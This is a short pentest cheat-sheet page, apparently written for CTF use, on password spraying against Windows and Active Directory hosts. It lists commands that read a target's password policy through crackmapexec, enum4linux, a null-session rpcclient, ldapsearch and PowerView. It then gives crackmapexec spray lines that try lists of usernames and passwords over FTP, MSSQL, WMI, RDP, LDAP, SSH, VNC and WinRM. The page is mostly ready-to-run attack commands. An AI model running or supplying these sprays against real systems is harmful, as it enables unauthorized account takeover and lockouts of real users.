---
description: >-
  Once you check the target's password policy, it might be beneficiary to run a
  password spray to get successful user/password combinations. Especially useful
  in CTF environment.
---

# Q password spray

### Enumeration on [Password Policy](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)

```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10; 
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```

### Execution

{% code overflow="wrap" %}
```bash
# Use My own script
# 
qspray nmap/all.nmap 

# crackmapexec !
cme ftp $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme mssql $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme wmi $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme rdp $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme ldap $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme ssh $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme vmc $RHOST -u usernames.txt -p usernames.txt --continue-on-success
cme winrm $RHOST -u usernames.txt -p usernames.txt --continue-on-success
```
{% endcode %}
